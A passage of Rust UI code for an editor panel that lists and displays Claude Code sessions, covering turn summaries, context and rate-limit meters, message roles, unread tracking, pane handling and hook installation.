    // builds a fresh skeleton for both sides of every comparison, so the skeletons
    // are taken once here the way `align` takes its own.
    let screen_skeletons = screen
        .iter()
        .map(|row| (row.glyph, terminal_anchors::skeleton(&row.text)))
        .collect::<Vec<_>>();
    let mut hits = vec![Vec::new(); screen.len()];
    for (transcript_index, anchor) in transcript.iter().enumerate() {
        let anchor_skeleton = terminal_anchors::skeleton(&anchor.text);
        for (screen_index, (glyph, row_skeleton)) in screen_skeletons.iter().enumerate() {
            if terminal_anchors::skeletons_match(
                *glyph,
                row_skeleton,
                anchor.glyph,
                &anchor_skeleton,
            ) {
                hits[screen_index].push(transcript_index);
            }
        }
    }

    let last_start = transcript.len() - window;
    let mut chosen: Option<(usize, usize)> = None;
    for start in 0..=last_start {
        let end = start + window;
        let cover = hits
            .iter()
            .filter(|hit| {
                let lower = hit.partition_point(|index| *index < start);
                lower < hit.len() && hit[lower] < end
            })
            .count();
        let replace = match chosen {
            Some((_, best_cover)) => cover >= best_cover,
            None => true,
        };
        if replace {
            chosen = Some((start, cover));
        }
    }
    let best_start = chosen.map_or(last_start, |(start, _)| start);
    &transcript[best_start..best_start + window]
}

fn message_anchor_text(source: &str) -> String {
    source.lines().next().unwrap_or("").to_string()
}

fn tool_anchor_text(name: &str, input: &str) -> String {
    let parsed = serde_json::from_str::<Value>(input).ok();
    let target = tool_target_from_input(parsed.as_ref());
    format!("{name}({target})")
}

fn edited_file_path(name: &str, input: &str) -> Option<SharedString> {
    if name != WRITE_TOOL_NAME && name != EDIT_TOOL_NAME && name != NOTEBOOK_EDIT_TOOL_NAME {
        return None;
    }
    parse_tool_input(input)?
        .get("file_path")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|path| !path.is_empty())
        .map(|path| SharedString::from(path.to_string()))
}

fn collapse_turns(
    entries: Vec<Entry>,
    expanded: &HashSet<SharedString>,
    expand_all: bool,
    current_turn_running: bool,
    agent_calls: &HashMap<SharedString, AgentCall>,
    timestamps: &HashMap<SharedString, i64>,
) -> Vec<Entry> {
    if entries.is_empty() {
        return entries;
    }

    let mut turn_starts = Vec::new();
    for (index, entry) in entries.iter().enumerate() {
        if entry_starts_user_turn(&entry.kind) {
            turn_starts.push(index);
        }
    }
    if turn_starts.is_empty() {
        return entries;
    }

    let mut collapsed = Vec::with_capacity(entries.len());
    collapsed.extend(entries[..turn_starts[0]].iter().cloned());

    for (turn_index, start) in turn_starts.iter().copied().enumerate() {
        let end = turn_starts
            .get(turn_index.saturating_add(1))
            .copied()
            .unwrap_or(entries.len());
        let is_current_running =
            current_turn_running && turn_index.saturating_add(1) == turn_starts.len();
        collapsed.extend(collapse_one_turn(
            &entries[start..end],
            expanded,
            expand_all,
            is_current_running,
            agent_calls,
            timestamps,
        ));
    }
    collapsed
}

fn collapse_one_turn(
    turn: &[Entry],
    expanded: &HashSet<SharedString>,
    expand_all: bool,
    is_current_running: bool,
    agent_calls: &HashMap<SharedString, AgentCall>,
    timestamps: &HashMap<SharedString, i64>,
) -> Vec<Entry> {
    let Some(first) = turn.first() else {
        return Vec::new();
    };
    if !entry_starts_user_turn(&first.kind) {
        return turn.to_vec();
    }
    let turn_id = first.key.clone();

    let mut calls = 0usize;
    let mut files_edited = Vec::new();
    let mut seen_files = HashSet::default();
    let mut thinking_blocks = 0usize;
    let mut duration_ms = None;
    let mut pending_background_agents = 0u64;
    let mut agents = 0usize;
    let mut first_detail = None;
    let mut first_timestamp = None;
    let mut last_timestamp = None;

    for (offset, entry) in turn.iter().enumerate() {
        if let Some(timestamp) = timestamps.get(&entry.key).copied() {
            if first_timestamp.is_none() {
                first_timestamp = Some(timestamp);
            }
            last_timestamp = Some(timestamp);
        }
        if is_turn_detail(&entry.kind) && first_detail.is_none() {
            first_detail = Some(offset);
        }
        match &entry.kind {
            EntryKind::ToolUse { name, input, .. } => {
                calls = calls.saturating_add(1);
                if agent_calls.contains_key(&entry.key) {
                    agents = agents.saturating_add(1);
                }
                if let Some(path) = edited_file_path(name, input)
                    && seen_files.insert(path.clone())
                {
                    files_edited.push(path);
                }
            }
            EntryKind::Thinking { .. } => {
                thinking_blocks = thinking_blocks.saturating_add(1);
            }
            EntryKind::TurnFooter {
                duration_ms: footer_duration,
                pending_background_agents: pending,
                ..
            } => {
                duration_ms = Some(*footer_duration);
                pending_background_agents = *pending;
            }
            _ => {}
        }
    }

    if duration_ms.is_none()
        && let (Some(first_timestamp), Some(last_timestamp)) = (first_timestamp, last_timestamp)
    {
        duration_ms = Some(last_timestamp.saturating_sub(first_timestamp).max(0) as u64);
    }

    // A turn with no tool calls has nothing to summarise; thinking and the footer stay
    // in place. The current running turn streams its tools, so it is never collapsed.
    if calls == 0 || is_current_running {
        return turn.to_vec();
    }

    let is_expanded = expand_all || expanded.contains(&turn_id);
    let summary = Entry {
        key: turn_summary_key(&turn_id),
        kind: EntryKind::TurnSummary {
            turn_id,
            calls,
            files_edited,
            agents,
            thinking_blocks,
            duration_ms,
            pending_background_agents,
            is_expanded,
        },
    };

    if is_expanded {
        let insert_at = first_detail.unwrap_or(turn.len());
        let mut expanded_turn = Vec::with_capacity(turn.len().saturating_add(1));
        expanded_turn.extend(turn[..insert_at].iter().cloned());
        expanded_turn.push(summary);
        expanded_turn.extend(turn[insert_at..].iter().cloned());
        expanded_turn
    } else {
        let mut collapsed = Vec::new();
        let mut pushed_summary = false;
        for entry in turn {
            if is_turn_detail(&entry.kind) {
                if !pushed_summary {
                    collapsed.push(summary.clone());
                    pushed_summary = true;
                }
            } else {
                collapsed.push(entry.clone());
            }
        }
        if !pushed_summary {
            collapsed.push(summary);
        }
        collapsed
    }
}

fn format_turn_summary_line(
    calls: usize,
    files_edited: usize,
    agents: usize,
    duration_ms: Option<u64>,
    is_expanded: bool,
) -> String {
    let glyph = if is_expanded { "▾" } else { "▸" };
    let mut parts = Vec::new();
    if calls > 0 {
        parts.push(if calls == 1 {
            "1 tool call".to_string()
        } else {
            format!("{calls} tool calls")
        });
    }
    if files_edited > 0 {
        parts.push(if files_edited == 1 {
            "1 file edited".to_string()
        } else {
            format!("{files_edited} files edited")
        });
    }
    if agents > 0 {
        parts.push(if agents == 1 {
            "1 agent".to_string()
        } else {
            format!("{agents} agents")
        });
    }
    if let Some(duration_ms) = duration_ms {
        parts.push(format_duration_seconds(duration_ms));
    }
    if parts.is_empty() {
        format!("{glyph} turn")
    } else {
        format!("{glyph} {}", parts.join(" · "))
    }
}

fn format_duration_seconds(duration_ms: u64) -> String {
    let total_seconds = duration_ms / 1000;
    if total_seconds < 60 {
        format!("{total_seconds}s")
    } else {
        format!("{}:{:02}", total_seconds / 60, total_seconds % 60)
    }
}

#[derive(Clone, Debug, PartialEq)]
enum NowRow {
    Tool {
        tool_use_id: String,
        name: SharedString,
        target: SharedString,
        started_at_ms: Option<i64>,
        input: Value,
    },
    Thinking {
        since_ms: Option<i64>,
    },
}

fn now_row(live: &LiveState, activity: &Activity) -> Option<NowRow> {
    if live.last_event_at_ms == 0 {
        return match activity {
            Activity::RunningTool { name, target } => Some(NowRow::Tool {
                tool_use_id: String::new(),
                name: name.clone(),
                target: target.clone(),
                started_at_ms: None,
                input: Value::Null,
            }),
            Activity::Thinking => Some(NowRow::Thinking { since_ms: None }),
            Activity::Idle => None,
        };
    }

    if let Some(tool) = live.running_tools.last() {
        return Some(now_row_from_running_tool(tool));
    }
    match live.turn {
        Turn::Running { since_ms } => Some(NowRow::Thinking {
            since_ms: Some(since_ms),
        }),
        Turn::Idle => None,
    }
}

fn now_row_from_running_tool(tool: &RunningTool) -> NowRow {
    NowRow::Tool {
        tool_use_id: tool.tool_use_id.clone(),
        name: SharedString::from(tool.name.clone()),
        target: tool_target_from_input(Some(&tool.input)),
        started_at_ms: Some(tool.started_at_ms),
        input: tool.input.clone(),
    }
}

fn format_elapsed_mm_ss(elapsed_ms: i64) -> String {
    let total_seconds = (elapsed_ms.max(0) / 1000).min(ELAPSED_DISPLAY_CAP_SECONDS);
    format!("{}:{:02}", total_seconds / 60, total_seconds % 60)
}

/// True after Stop has already written an interrupt outbox file, until the 5s
/// "interrupt sent" window ends. The channel server also throttles SIGINT at 3s;
/// without this a double-click queues a second file while the turn is still Running.
fn interrupt_is_awaiting_result(sent_at_ms: Option<i64>, now_ms: i64) -> bool {
    sent_at_ms.is_some_and(|sent_at_ms| now_ms.saturating_sub(sent_at_ms) < INTERRUPT_SENT_MS)
}

fn live_message_is_visible(live: &LiveState, now_ms: i64) -> bool {
    let Some(message) = live.live_message.as_ref() else {
        return false;
    };
    if message.text.trim().is_empty() {
        return false;
    }
    let stale = now_ms.saturating_sub(message.updated_at_ms) > LIVE_MESSAGE_STALE_MS;
    !(stale && matches!(live.turn, Turn::Idle))
}

fn live_message_markdown_key(message_id: Option<&str>) -> SharedString {
    SharedString::from(format!("live:{}", message_id.unwrap_or("pending")))
}

fn clamp_live_message_height(requested: Pixels, rem_size: Pixels, panel_height: Pixels) -> Pixels {
    let min_height = rem_size * LIVE_MESSAGE_MIN_HEIGHT_REMS;
    let max_height = (panel_height * LIVE_MESSAGE_HEIGHT_PANEL_FRACTION).max(min_height);
    requested.max(min_height).min(max_height)
}

#[derive(Clone, Debug, PartialEq)]
struct ContextMeter {
    fill: Option<f32>,
    label: SharedString,
    color: Color,
    tooltip: Option<String>,
}

fn context_meter_color(percentage: f64) -> Color {
    if percentage < 60. {
        Color::Muted
    } else if percentage <= 85. {
        Color::Warning
    } else {
        Color::Error
    }
}

fn context_meter(
    status: Option<&StatusSnapshot>,
    spend: &Spend,
    compacting: bool,
) -> Option<ContextMeter> {
    let context_tokens = spend.context_tokens;
    let window = status.and_then(|status| status.context_window_size);
    let used_percentage = status
        .and_then(|status| status.context_used_percentage)
        .or_else(|| {
            window
                .filter(|window| *window > 0)
                .map(|window| (context_tokens as f64) * 100. / (window as f64))
        })
        .map(|percentage| percentage.clamp(0., 100.));

    if context_tokens == 0 && used_percentage.is_none() && window.is_none() {
        return None;
    }

    let fill = used_percentage.map(|percentage| (percentage / 100.) as f32);
    let label = match (context_tokens, window, used_percentage) {
        (tokens, Some(window), Some(percentage)) if tokens > 0 => SharedString::from(format!(
            "{} / {} · {:.0}%",
            compact_token_count(tokens),
            compact_token_count(window),
            percentage
        )),
        (tokens, Some(window), None) if tokens > 0 => SharedString::from(format!(
            "{} / {}",
            compact_token_count(tokens),
            compact_token_count(window)
        )),
        (tokens, None, Some(percentage)) if tokens > 0 => SharedString::from(format!(
            "{} · {:.0}%",
            compact_token_count(tokens),
            percentage
        )),
        (0, _, Some(percentage)) => SharedString::from(format!("{percentage:.0}%")),
        (tokens, _, _) if tokens > 0 => {
            SharedString::from(format!("{} ctx", compact_token_count(tokens)))
        }
        _ => return None,
    };

    let color = used_percentage
        .map(context_meter_color)
        .unwrap_or(Color::Muted);

    let mut tooltip_parts = Vec::new();
    if spend.context_is_post_compaction {
        tooltip_parts.push(
            "(compacted) Context after compaction counts the kept conversation alone. The next answer is larger once tools and skills are re-sent.".to_string(),
        );
    }
    if compacting {
        tooltip_parts.push("compacting…".to_string());
    }

    Some(ContextMeter {
        fill,
        label,
        color,
        tooltip: (!tooltip_parts.is_empty()).then_some(tooltip_parts.join("\n")),
    })
}

fn tokens_left_quantity(tokens: u64) -> String {
    if tokens >= 1_000_000 {
        format!("{:.1}M", tokens as f64 / 1_000_000.)
    } else if tokens >= 1_000 {
        if tokens.is_multiple_of(1_000) {
            format!("{}K", tokens / 1_000)
        } else {
            format!("{:.1}K", tokens as f64 / 1_000.)
        }
    } else {
        format!("{tokens}")
    }
}

fn tokens_left_fact(tokens_left: u64) -> SharedString {
    SharedString::from(format!("{} tokens left", tokens_left_quantity(tokens_left)))
}

fn rate_limit_fact(five_hour: Option<f64>, seven_day: Option<f64>) -> Option<SharedString> {
    match (five_hour, seven_day) {
        (Some(five), Some(seven)) => Some(SharedString::from(format!(
            "5h {five:.0}% · 7d {seven:.0}%"
        ))),
        (Some(five), None) => Some(SharedString::from(format!("5h {five:.0}%"))),
        (None, Some(seven)) => Some(SharedString::from(format!("7d {seven:.0}%"))),
        (None, None) => None,
    }
}

fn format_resets_at(resets_at: i64) -> Option<String> {
    if resets_at <= 0 {
        return None;
    }
    chrono::DateTime::from_timestamp(resets_at, 0).map(|time| {
        time.with_timezone(&chrono::Local)
            .format("%Y-%m-%d %H:%M")
            .to_string()
    })
}

fn panel_is_narrow(window: &Window) -> bool {
    window.bounds().size.width < px(NARROW_PANEL_WIDTH_PIXELS)
}

/// The command line the Attach button opens a terminal on, or `None` when the id the
/// agents listing gave is not one a shell may be handed.
///
/// The terminal takes a command line rather than a program and its arguments, so an id
/// able to close the word it sits in would be a second command — chosen, on a remote
/// project, by the far end — running on this machine. The neighbouring tmux button quotes
/// its target for the same reason.
fn attach_command(agent_id: &str) -> Option<String> {
    let agent_id = crate::session_registry::claude_command_operand(agent_id)?;
    Some(format!("claude attach {agent_id}"))
}

fn claude_ai_session_url(bridge_session_id: Option<&str>) -> Option<String> {
    let id = bridge_session_id
        .map(str::trim)
        .filter(|id| !id.is_empty())?;
    let url = format!("{BRIDGE_URL_PREFIX}code/{id}");
    bridge_url(&url).map(|url| url.to_string())
}

fn toolbar_model(status: Option<&StatusSnapshot>, spend: &Spend) -> Option<SharedString> {
    status
        .and_then(|status| status.model_display_name.as_deref())
        .map(str::trim)
        .filter(|name| !name.is_empty())
        .map(|name| SharedString::from(name.to_string()))
        .or_else(|| spend.model.clone())
}

fn toolbar_effort(status: Option<&StatusSnapshot>, spend: &Spend) -> Option<SharedString> {
    status
        .and_then(|status| status.effort.as_deref())
        .map(str::trim)
        .filter(|effort| !effort.is_empty())
        .map(|effort| SharedString::from(effort.to_string()))
        .or_else(|| spend.effort.clone())
}

fn toolbar_cost(status: Option<&StatusSnapshot>, spend: &Spend) -> Option<SharedString> {
    status
        .and_then(|status| status.total_cost_usd)
        .map(|total| SharedString::from(format_usd(total)))
        .or_else(|| session_cost(spend))
}

fn format_status_line(
    turn: &Turn,
    permission_mode: Option<&str>,
    channel_live: bool,
    now_ms: i64,
) -> String {
    let turn_part = match turn {
        Turn::Idle => "● idle".to_string(),
        Turn::Running { since_ms } => {
            format!(
                "● running {}",
                format_elapsed_mm_ss(now_ms.saturating_sub(*since_ms))
            )
        }
    };
    let mode = permission_mode
        .map(str::trim)
        .filter(|mode| !mode.is_empty())
        .unwrap_or("unknown");
    let channel_part = if channel_live {
        "channel: connected"
    } else {
        "channel: not loaded — Setup"
    };
    format!("{turn_part} · mode: {mode} · {channel_part}")
}

#[derive(Clone, Debug, PartialEq)]
enum MessageRole {
    User,
    Assistant,
    /// Another session or a subagent, never styled as the reader.
    Peer {
        from: Option<SharedString>,
    },
    System,
    Other,
    /// The record compaction writes in the user's place, which carries `"type":"user"`
    /// but was not typed by the user.
    CompactSummary,
}

/// How many entries have arrived since the reader was last at the bottom of the
/// conversation.
///
/// The list follows the tail only while it is already at the bottom, because a reader who
/// has scrolled up is reading something and must not be yanked away from it. That leaves
/// the case this counts: new messages landing below the window, out of sight, which is
/// what makes a session that is streaming look like a session that has stopped.
#[derive(Default)]
struct UnreadBelow {
    count: usize,
}

impl UnreadBelow {
    /// `at_bottom` is where the list sat *before* the new entries were spliced in, which
    /// is what decides whether they were scrolled into view or landed below the window.
    fn entries_arrived(&mut self, added: usize, at_bottom: bool) {
        if at_bottom {
            self.count = 0;
        } else {
            self.count = self.count.saturating_add(added);
        }
    }

    /// Called with where the list sits now: the count is what has arrived since the
    /// reader was last at the bottom, so being there again is having read it.
    fn scrolled(&mut self, at_bottom: bool) {
        if at_bottom {
            self.count = 0;
        }
    }

    /// A different session is a different conversation, and the reader is shown the
    /// newest of it, so nothing is owed to them from the one they left.
    fn reset(&mut self) {
        self.count = 0;
    }

    fn count(&self) -> usize {
        self.count
    }
}

#[derive(Clone)]
enum OutputLoad {
    Loading,
    Loaded(SharedString),
    Failed(SharedString),
}

/// A sent image being fetched from the machine the session runs on.
#[derive(Clone)]
enum AttachmentLoad {
    Loading,
    Loaded(Arc<Image>),
    Failed(SharedString),
}

impl MessageRole {
    fn from_record_type(record_type: &str) -> Self {
        match record_type {
            "user" => Self::User,
            "assistant" => Self::Assistant,
            _ => Self::Other,
        }
    }

    fn label(&self) -> SharedString {
        match self {
            Self::User => SharedString::from("You"),
            Self::Assistant => SharedString::from("Claude"),
            Self::Peer { from } => match from
                .as_ref()
                .map(|from| from.trim())
                .filter(|from| !from.is_empty())
            {
                Some(from) => SharedString::from(format!("Message from {from}")),
                None => SharedString::from("Message from another session"),
            },
            Self::System => SharedString::from("System"),
            Self::Other => SharedString::from("Message"),
            Self::CompactSummary => SharedString::from("Summary"),
        }
    }

    fn icon(&self) -> IconName {
        match self {
            Self::User => IconName::Person,
            Self::Assistant => IconName::AiClaude,
            Self::Peer { .. } => IconName::Chat,
            Self::System => IconName::Info,
            Self::Other => IconName::Chat,
            Self::CompactSummary => IconName::Compact,
        }
    }

    /// Each speaker keeps a color of its own, because the panel is often narrow enough
    /// that a label is truncated and the color is what is left to tell the rows apart.
    fn color(&self) -> Color {
        match self {
            // Read apart from the assistant's at a glance: both were blues, and the rail
            // beside a message is the only thing that says whose it is.
            Self::User => Color::Error,
            Self::Assistant => Color::Accent,
            Self::Peer { .. } => Color::Muted,
            Self::System => Color::Muted,
            Self::Other => Color::Muted,
            Self::CompactSummary => Color::Warning,
        }
    }
}

/// Whether the pane should embed a tmux client for the selected conversation.
///
/// The identity is the tmux pane and the process in it. `/clear` replaces the
/// conversation id and leaves both where they were; keying on the conversation would
/// detach the reader and mint a second mirror.
///
/// `attach_arguments` mints a mirror name as it answers, so calling it on every frame
/// would burn a name the terminal never uses. It returns `None` only when the field has
/// no pane id, which is [`pane_target`].
fn wanted_terminal(
    in_pane: bool,
    transcript_is_main: bool,
    live_session: Option<(&str, u32, Option<&str>)>,
) -> Option<TerminalTarget> {
    if !in_pane || !transcript_is_main {
        return None;
    }
    let (_session_id, process_id, tmux_target) = live_session?;
    let pane = crate::session_registry::pane_target(tmux_target?)?;
    Some(TerminalTarget { pane, process_id })
}

impl ClaudeSessionsPanel {
    pub async fn load(
        workspace: WeakEntity<Workspace>,
        mut cx: AsyncWindowContext,
    ) -> anyhow::Result<Entity<Self>> {
        workspace.update_in(&mut cx, |workspace, window, cx| {
            ClaudeSessionsPanel::new(workspace, window, cx)
        })
    }

    pub fn new(
        workspace: &mut Workspace,
        window: &mut Window,
        cx: &mut Context<Workspace>,
    ) -> Entity<Self> {
        let workspace_handle = workspace.weak_handle();
        let project = workspace.project().clone();
        let fs = workspace.app_state().fs.clone();

        cx.new(|cx| {
            let project_root = project
                .read(cx)
                .visible_worktrees(cx)
                .next()
                .map(|worktree| worktree.read(cx).abs_path().to_path_buf());
            // The sessions worth showing are the ones on the machine the project is
            // opened from: on a remote project they are read over that project's
            // connection, and the panel is otherwise the same on both.
            let source: Arc<dyn SessionSource> = match project.read(cx).remote_client() {
                Some(remote_client) => Arc::new(RemoteSource::new(
                    remote_client.read(cx).proto_client(),
                    cx.background_executor().clone(),
                )),
                None => Arc::new(LocalSource::new(cx.background_executor().clone())),
            };
            let store =
                cx.new(|cx| ClaudeSessionStore::new(source.clone(), project_root.clone(), cx));
            Self::new_reading(
                workspace_handle,
                fs,
                store,
                source,
                project_root,
                window,
                cx,
            )
        })
    }

    /// Opens the session selected in the dock as a tab in the editor area, for a
    /// conversation that is easier to read at the width of a pane than at the width of a
    /// dock.
    pub fn open_in_pane(
        workspace: &mut Workspace,
        window: &mut Window,
        cx: &mut Context<Workspace>,
    ) {
        let Some(panel) = workspace.panel::<Self>(cx) else {
            return;
        };
        let (fs, source, project_root, session_id, seed, target) = {
            let panel = panel.read(cx);
            let store = panel.store.read(cx);
            (
                panel.fs.clone(),
                panel.source.clone(),
                panel.project_root.clone(),
                store.selected().map(str::to_string),
                // What this store already knows about the session being opened, so that
                // the tab is not blocked on a scan of its own to learn it again.
                store.session_seed(),
                // What the reader is looking at, not just which session it belongs to: a
                // tab opened from an agent's conversation is opened to read that agent.
                store.transcript_target().clone(),
            )
        };
        Self::reveal_session_in_pane(
            workspace,
            fs,
            source,
            project_root,
            session_id,
            seed,
            target,
            window,
            cx,
        );
    }

    /// Brings the tab that reads `process_id` forward, opening one when the window has
    /// none for it. Called from the dock, where selecting a session would otherwise
    /// leave the reader with a selection and nowhere it is shown, and from a tab, which
    /// is where the agents of the conversation on screen are offered.
    ///
    /// The fields are taken from `self` rather than read back off the workspace, which
    /// would read this entity while it is the one being updated.
    ///
    /// Deferred to the end of the effect cycle, which is what returns this panel to the
    /// app: every call reaches here from a click handler, which holds the panel off the
    /// entity map for as long as it runs, and looking for the tab to bring forward walks
    /// every item of the workspace and reads it. Drawn as a tab, this panel is one of
    /// them — and reading an entity that is in the middle of being updated is a panic,
    /// so this crashed for every way into an agent offered from a tab.
    fn reveal_in_pane(
        &mut self,
        session_id: Option<String>,
        target: TranscriptTarget,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let Some(workspace) = self.workspace.upgrade() else {
            return;
        };
        let fs = self.fs.clone();
        let source = self.source.clone();
        let project_root = self.project_root.clone();
        let seed = self.store.read(cx).session_seed();
        window.defer(cx, move |window, cx| {
            workspace.update(cx, |workspace, cx| {
                Self::reveal_session_in_pane(
                    workspace,
                    fs,
                    source,
                    project_root,
                    session_id,
                    seed,
                    target,
                    window,
                    cx,
                );
            });
        });
    }

    /// Opens one of the session's agent conversations as a tab of its own, so that a run
    /// of several can be watched beside the conversation that started it.
    fn open_agent_in_pane(
        &mut self,
        target: TranscriptTarget,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) {
        let session_id = self.store.read(cx).selected().map(str::to_string);
        self.reveal_in_pane(session_id, target, window, cx);
    }

    /// One tab per session, identified by the process it is reading.
    ///
    /// A tab holds a store of its own, pinned to the session it was opened for, so that
    /// opening a second conversation leaves the first tab reading what it was reading
    /// instead of being retargeted under the reader. Asking for a session a tab already
    /// holds activates that tab rather than opening a second one: two tabs of the same
    /// conversation would only be two copies of the same scroll position.
    ///
    /// Matched on the process id rather than on the name in the tab, because two
    /// sessions run from the same directory carry the same name, and the point of a tab
    /// of its own is that it keeps showing the conversation it was opened for.
    fn reveal_session_in_pane(
        workspace: &mut Workspace,
        fs: Arc<dyn Fs>,
        source: Arc<dyn SessionSource>,
        project_root: Option<PathBuf>,
        session_id: Option<String>,
        seed: Option<(RegisteredSession, Option<PathBuf>)>,
        target: TranscriptTarget,
        window: &mut Window,
        cx: &mut Context<Workspace>,
    ) {
        // Bound before the call below so that the iterator's borrow of the workspace has
        // ended by the time the item is activated through it.
        //
        // Matched on the conversation as well as the session: two agents of one session
        // are two things to read, and a tab showing one of them is not the tab for the
        // other.
        let existing = workspace.items_of_type::<Self>(cx).find(|item| {
            let store = item.read(cx).store.read(cx);
            store.selected() == session_id.as_deref() && *store.transcript_target() == target
        });
        if let Some(existing) = existing {
            workspace.activate_item(&existing, true, true, window, cx);
            return;
        }

        let workspace_handle = workspace.weak_handle();
        let item = cx.new(|cx| {
            let store = cx.new(|cx| {
                let mut store = ClaudeSessionStore::new(source.clone(), project_root.clone(), cx);
                // Before selecting, which is what turns a session id into the
                // conversation being followed: a tab handed only a session id has nothing
                // to follow until a scan of its own lands, and draws "no transcript yet"
                // over the conversation it was opened to read until one does.
                if let Some((session, transcript_path)) = seed {
                    store.seed_session(session, transcript_path, cx);
                }
                if let Some(session_id) = session_id {
                    store.select(session_id, cx);
                }
                // After selecting, which follows the session's own conversation.
                if target != TranscriptTarget::Main {
                    store.select_transcript_target(target, cx);
                }
                store
            });
            let mut this = Self::new_reading(
                workspace_handle,
                fs,
                store,
                source,
                project_root,
                window,
                cx,
            );
            this.in_pane = true;
            this
        });
        workspace.add_item_to_active_pane(Box::new(item), None, true, window, cx);
    }

    fn new_reading(
        workspace: WeakEntity<Workspace>,
        fs: Arc<dyn Fs>,
        store: Entity<ClaudeSessionStore>,
        source: Arc<dyn SessionSource>,
        project_root: Option<PathBuf>,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> Self {
        let store_subscription = cx.observe(&store, |this: &mut Self, _, cx| {
            this.rebuild_entries(cx);
            this.follow_the_live_message(cx);
            if this.in_pane {
                cx.emit(ItemNameChanged);
            }
            cx.notify();
        });

        Self {
            workspace,
            focus_handle: cx.focus_handle(),
            fs,
            store,
            source,
            project_root,
            in_pane: false,
            terminal: None,
            terminal_for: None,
            _terminal_attach: Task::ready(()),
            rail_expanded: true,
            rail_shows_everything: false,
            permission_answered: false,
            permission_answered_for: None,
            live_message_scroll: ScrollHandle::new(),
            live_message_length: 0,
            live_message_markdown_key: None,
            live_message_identity: None,
            live_message_height: rems(LIVE_MESSAGE_MAX_HEIGHT_REMS).to_pixels(window.rem_size()),
            live_message_drag: None,
            now_row_expanded: false,
            interrupt_sent_at_ms: None,
            stop_armed_until_ms: None,
            lifecycle_note: None,
            _lifecycle_command: Task::ready(()),
            hook_install_note: None,
            _installing_hook: Task::ready(()),
            entries: Vec::new(),
            activity: Activity::Idle,
            agent_calls: HashMap::default(),
            billing: HashMap::default(),
            turn_bills: HashMap::default(),
            list_state: scroll_tracking_list_state(cx),
            session_list_expanded: true,
            collapsed_session_agents: HashSet::default(),
            unread_below: UnreadBelow::default(),
            scrolled_to_end: true,
            expanded: HashSet::default(),
            show_full_history: false,
            show_tool_calls: false,
            show_costs: true,
            markdowns: HashMap::default(),
            entry_cache: EntryCache::default(),
            cached_transcript_generation: 0,
            cached_home_directory: None,
            overwrites_dropped: 0,
            loaded_outputs: HashMap::default(),
            output_loads: HashMap::default(),
            loaded_attachments: HashMap::default(),
            forced_attachment_loads: HashSet::default(),
            dispatch_prompts: HashMap::default(),
            patched_calls: HashSet::default(),
            attachment_loads: HashMap::default(),
            entries_generation: 0,
            reachable_anchors: Vec::new(),
            anchor_cache: None,
            cached_scrolled_back: false,
            rail_width: px(RAIL_WIDTH_DEFAULT_PIXELS),
            rail_row_budget: None,
            rail_drag_position: None,
            zoomed_image: None,
            anchored_on_screen: HashSet::default(),
            hovered_anchor: None,
            followed_index: None,
            _store_subscription: store_subscription,
        }
    }

    fn select_session(&mut self, session_id: String, cx: &mut Context<Self>) {
        self.show_the_newest_of_another_conversation();
        self.store
            .update(cx, |store, cx| store.select(session_id, cx));
    }

    /// What is owed to a reader who has been moved to another conversation, whichever
    /// gesture moved them: whether the last one had been compacted says nothing about
    /// this one, so the history toggle starts closed; and what they are shown of it is
    /// its newest end, not the place they had scrolled the last one to, so nothing of it
    /// is owed to them as unread either.
    fn show_the_newest_of_another_conversation(&mut self) {
        self.show_full_history = false;
        self.unread_below.reset();
        self.list_state.scroll_to_end();
        self.scrolled_to_end = true;
        // Aimed at the session being left: an Allow/Deny for its prompt is not an
        // answer to the next session's.
        self.permission_answered = false;
        self.permission_answered_for = None;
    }

    fn install_hooks(&mut self, cx: &mut Context<Self>) {
        let install = self.store.update(cx, |store, cx| store.install_hooks(cx));

        self.hook_install_note = Some(SharedString::from("Installing…"));
        self._installing_hook = cx.spawn(async move |this, cx| {
            let result = install.await;
            this.update(cx, |this, cx| {
                this.hook_install_note = Some(match result {
                    Ok(HookInstallOutcome::AlreadyCurrent) => {
                        SharedString::from("Hooks are up to date")
                    }
                    Ok(HookInstallOutcome::ScriptsRefreshed) => SharedString::from(
                        "Hook scripts updated; restart Claude to pick them up",
                    ),
                    Ok(HookInstallOutcome::Installed { backup_path: Some(backup) }) => {
                        SharedString::from(format!(
                            "Hooks installed (settings backed up to {}); restart Claude to pick them up",
                            backup.display()
                        ))
                    }
                    Ok(HookInstallOutcome::Installed { backup_path: None }) => {
                        SharedString::from(
                            "Hooks installed; restart Claude to pick them up",
                        )
                    }
                    Err(error) => SharedString::from(format!("Could not install: {error:#}")),
                });
                cx.notify();
            })
            .log_err();
        });
        cx.notify();
    }

    fn uninstall_hooks(&mut self, cx: &mut Context<Self>) {
        let uninstall = self.store.update(cx, |store, cx| store.uninstall_hooks(cx));

        self.hook_install_note = Some(SharedString::from("Uninstalling…"));
        self._installing_hook = cx.spawn(async move |this, cx| {
            let result = uninstall.await;
            this.update(cx, |this, cx| {
                this.hook_install_note = Some(uninstall_hooks_note(result));
                cx.notify();
            })
            .log_err();
        });
        cx.notify();
    }

    fn toggle_session_list(&mut self, cx: &mut Context<Self>) {
        self.session_list_expanded = !self.session_list_expanded;
        cx.notify();
    }

    /// Folds one session's agent rows away, or brings them back.
    fn toggle_session_agents(&mut self, session_id: String, cx: &mut Context<Self>) {
        if !self.collapsed_session_agents.remove(&session_id) {
            self.collapsed_session_agents.insert(session_id);
        }
        cx.notify();
    }

    /// Takes the reader to the newest of the conversation, which is what the count of
    /// what arrived below their window offers.
    fn scroll_to_latest(&mut self, cx: &mut Context<Self>) {
        self.list_state.scroll_to_end();
        self.scrolled_to_end = true;
        self.unread_below.reset();
        cx.notify();
    }

    /// Only the drawing changes, so the entries stand — but every entry that gains or
    /// loses a line of cost changes height, and the list holds the heights it measured.
    fn toggle_costs(&mut self, cx: &mut Context<Self>) {
        self.show_costs = !self.show_costs;
        let count = self.entries.len();
        self.list_state.remeasure_items(0..count);
        cx.notify();
    }

    /// The entries stay put — list indices are the entries — but a body that
    /// appears or disappears changes the height the list measured.
    fn toggle_rail_shows_everything(&mut self, cx: &mut Context<Self>) {
        self.rail_shows_everything = !self.rail_shows_everything;
        let count = self.entries.len();
        self.list_state.remeasure_items(0..count);
        cx.notify();
    }

    /// The entries are rebuilt rather than filtered at draw time, because the list
    /// measures what it is given: hiding an item the list still holds would leave its
    /// height behind as a gap.
    fn toggle_tool_calls(&mut self, cx: &mut Context<Self>) {
        self.show_tool_calls = !self.show_tool_calls;
